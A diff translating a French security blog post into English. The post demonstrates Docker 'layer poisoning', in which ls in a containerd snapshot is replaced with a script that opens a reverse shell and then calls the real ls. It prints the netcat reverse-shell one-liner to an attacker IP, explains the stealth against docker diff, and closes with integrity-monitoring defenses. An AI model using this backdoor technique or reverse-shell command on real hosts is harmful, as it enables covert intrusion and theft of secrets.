@@ -3,7 +3,7 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Layer Poisoning : Attaquer Docker par ses fondations</title>
+    <title>Layer poisoning: Attacking docker from its foundations</title>
     <link rel="stylesheet" href="../../styles/style.css" />
   </head>
   <body>
@@ -21,98 +21,98 @@
 
     <main class="container page-content">
       <article class="section">
-        <h1>Layer poisoning, l'art de compromettre Docker par ses fondations</h1>
+        <h1>Layer poisoning, the art of compromising docker from its foundations</h1>
         
         <p class="post-intro">
-          On présente souvent les conteneurs Docker comme des environnements isolés et immuables. Pourtant, il existe une technique d'attaque appelée <strong>Layer Poisoning</strong>. 
-          Elle permet de compromettre un conteneur en modifiant silencieusement ses couches de système de fichiers directement sur l'hôte.
+          Docker containers are often presented as isolated and immutable environments. Yet, there is an attack technique called <strong>Layer poisoning</strong>. 
+          It allows compromising a container by silently modifying its file system layers directly on the host.
         </p>
 
         <hr>
 
-        <h2>1. Le concept : Empoisonner la source</h2>
+        <h2>1. The concept: Poisoning the source</h2>
         <p>
-          Le "Layer Poisoning" consiste à injecter du code malveillant dans les snapshots de stockage de Docker (gérés par <em>containerd</em>). Ce n'est pas un bug de Docker en soi, mais une exploitation directe de son architecture. Si un attaquant parvient à obtenir un accès root sur l'hôte, il peut modifier les fichiers "sources" que le conteneur utilise pour démarrer. Résultat ? Une backdoor persistante, invisible pour les outils de scan classiques.
+          "Layer poisoning" involves injecting malicious code into docker's storage snapshots (managed by <em>containerd</em>). It's not a docker bug per se, but a direct exploitation of its architecture. If an attacker manages to gain root access on the host, they can modify the "source" files that the container uses to start. The result? A persistent backdoor, invisible to standard scanning tools.
         </p>
 
-        <h2>2. Docker et OverlayFS</h2>
+        <h2>2. Docker and OverlayFS</h2>
         <p>
-          Pour comprendre l'attaque, il faut comprendre <strong>OverlayFS</strong>. Docker empile les couches d'images pour former le système de fichiers final du conteneur. Ce mécanisme repose sur trois piliers :
+          To understand the attack, you need to understand <strong>OverlayFS</strong>. Docker stacks image layers to form the container's final file system. This mechanism relies on three pillars:
         </p>
         <ul>
-          <li><strong>Lowerdir :</strong> Les couches de l'image de base (ex: Alpine), normalement en lecture seule.</li>
-          <li><strong>Upperdir :</strong> La couche d'écriture propre au conteneur (où vont vos modifications).</li>
-          <li><strong>Merged :</strong> La vue fusionnée que l'utilisateur voit à l'intérieur du conteneur.</li>
+          <li><strong>Lowerdir:</strong> The base image layers (e.g., alpine), normally read-only.</li>
+          <li><strong>Upperdir:</strong> The write layer specific to the container (where your modifications go).</li>
+          <li><strong>Merged:</strong> The merged view that the user sees inside the container.</li>
         </ul>
         <p>
-          En temps normal, le <em>lowerdir</em> est protégé. Mais sur l'hôte, ces fichiers sont stockés dans <code>/var/lib/containerd/.../snapshots/</code>. En modifiant ces snapshots, on modifie l'ADN même du conteneur.
+          Normally, the <em>lowerdir</em> is protected. But on the host, these files are stored in <code>/var/lib/containerd/.../snapshots/</code>. By modifying these snapshots, you modify the very DNA of the container.
         </p>
 
-        <h2>3. Anatomie d'une attaque (Proof of Concept)</h2>
-        <p>Passons à la pratique. L'objectif ici est de transformer une commande banale (<code>ls</code>) en un vecteur de connexion pour l'attaquant.</p>
+        <h2>3. Anatomy of an attack (PoC)</h2>
+        <p>Let's move to practice. The objective here is to transform a mundane command (<code>ls</code>) into a connection vector for the attacker.</p>
 
-        <p>Côté attaquant : On prépare un listener netcat sur le port 4444 :</p>
+        <p>Attacker's side: We set up a netcat listener on port 4444:</p>
 
         <figure>
           <img src="images/a_lp_1.png" alt="Netcat listener setup" />
         </figure>
 
-        <p>On lance deux conteneurs Alpine classiques. Pour l'expérience, on suppose qu'on a déjà un accès root sur l'hôte.</p>
+        <p>We launch two standard alpine containers. For the experiment, we assume we already have root access on the host.</p>
 
         <figure>
-          <img src="images/v_lp_1.png" alt="Starting Alpine containers" />
+          <img src="images/v_lp_1.png" alt="Starting alpine containers" />
         </figure>
 
-        <p>Notre but est de trouver où ces conteneurs "vivent" physiquement.</p>
+        <p>Our goal is to find where these containers "live" physically.</p>
 
         <figure>
           <img src="images/v_lp_2.png" alt="Inspecting container and overlayfs mount" />
         </figure>
 
-        <p>Ici, on identifie le point de montage OverlayFS associé au conteneur.</p>
+        <p>Here, we identify the OverlayFS mount point associated with the container.</p>
 
-        <p>Une fois dans le snapshot (ici le n°49), on a accès à l'arborescence complète du conteneur (<code>/bin</code>, <code>/etc</code>, etc.). C'est ici qu'on va agir :</p>
+        <p>Once inside the snapshot (here number 49), we have access to the complete directory tree of the container (<code>/bin</code>, <code>/etc</code>, etc.). This is where we'll act:</p>
 
         <figure>
           <img src="images/v_lp_3.png" alt="Exploring the snapshot" />
         </figure>
         
-       <p>On remplace le binaire <code>ls</code> par un script malveillant :</p>
+       <p>We replace the <code>ls</code> binary with a malicious script:</p>
 
         <figure>
           <img src="images/v_lp_4.png" alt="Modifying ls binary" />
         </figure>
 
-        <p>Ce script fait deux choses : Il lance un <strong>Reverse Shell</strong> en arrière-plan vers l'IP de l'attaquant et il appelle le vrai binaire <code>ls</code> pour que l'utilisateur ne remarque rien.</p>
+        <p>This script does two things: It launches a <strong>reverse shell</strong> in the background to the attacker's IP and calls the real <code>ls</code> binary so the user doesn't notice anything.</p>
         <pre><code>(mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 172.17.0.1 4444 > /tmp/f &) > /dev/null 2>&1</code></pre>
 
-        <p>Maintenant, quand l'utilisateur exécute la commande <code>ls /etc,</code>, voici ce qu'il observe :</p>
+        <p>Now, when the user executes the command <code>ls /etc,</code>, here's what they observe:</p>
         
         <figure>
           <img src="images/v_lp_5.png" alt="Victim executing ls" />
         </figure>
 
-        <p>L'affichage est normal, l'illusion est parfaite.</p>
+        <p>The display is normal, the illusion is perfect.</p>
         
-        <p>Coté attaquant : La connexion arrive :</p>
+        <p>Attacker's side, the connection arrives:</p>
 
         <figure>
           <img src="images/a_lp_2.png" alt="Attacker receiving access" />
         </figure>
 
-        </p>On devient root et on peut lire les secrets (/etc/shadow, variables d'env, etc.).</p>
+        </p>We become root and can read secrets (/etc/shadow, environment variables, etc.).</p>
 
-        <h2>4. Au final, pourquoi c'est redoutable ?</h2>
+        <h2>4. After all, why is it so dangerous?</h2>
         <p>
-          Ce qui rend le Layer Poisoning particulièrement vicieux, c'est sa discrétion. Si vous lancez un <code>docker diff</code>, Docker ne verra aucune modification parce que la modification a eu lieu dans le <strong>Lowerdir</strong> (l'image de base) et non dans la couche d'écriture du conteneur. 
-          En plus de ça, tout nouveau conteneur créé à partir de cette image locale sera nativement infecté.
+          What makes layer poisoning particularly insidious is its discretion. If you run <code>docker diff</code>, docker won't see any modifications because the change occurred in the <strong>lowerdir</strong> (the base image) and not in the container's write layer. 
+          On top of that, any new container created from this local image will be natively infected.
         </p>
 
         <h2>5. Conclusion</h2>
         <p>
-          Cette démonstration prouve que si l'intégrité de l'hôte est compromise, c'est le conteneur qui est en danger. Selon moi, quelques pistes d'amélioration... 
+          This demonstration proves that if the host's integrity is compromised, the container is in danger. In my opinion, a few avenues for improvement... 
 
-          Tout repose d'abord sur le PoLP afin de verrouiller l'accès aux dossiers critiques de containerd. Ensuite, j'ai vu qu'il existe l'option <code>--read-only</code> qui permet de neutraliser la persistance d'une intrusion. Enfin, plus poussé mais il y a aussi des outils de monitoring d'intégrité (FIM) qui peuvent être utilisés pour détecter en temps réel la moindre modification suspecte au sein de <code>/var/lib/docker</code>. Des solutions comme <em>Tripwire</em> ou <em>AIDE</em> peuvent être configurées pour surveiller ces répertoires sensibles et alerter les administrateurs en cas de changement inattendu.
+          Everything first relies on the PoLP to lock down access to critical containerd folders. Next, I found that there is a <code>--read-only</code> option that neutralizes the persistence of an intrusion. Finally, more advanced but there are also file integrity monitoring tools (FIM) that can be used to detect in real-time any suspicious modification within <code>/var/lib/docker</code>. Solutions like <em>Tripwire</em> or <em>AIDE</em> can be configured to monitor these sensitive directories and alert administrators in case of unexpected changes.
         </p>
 
       </article>
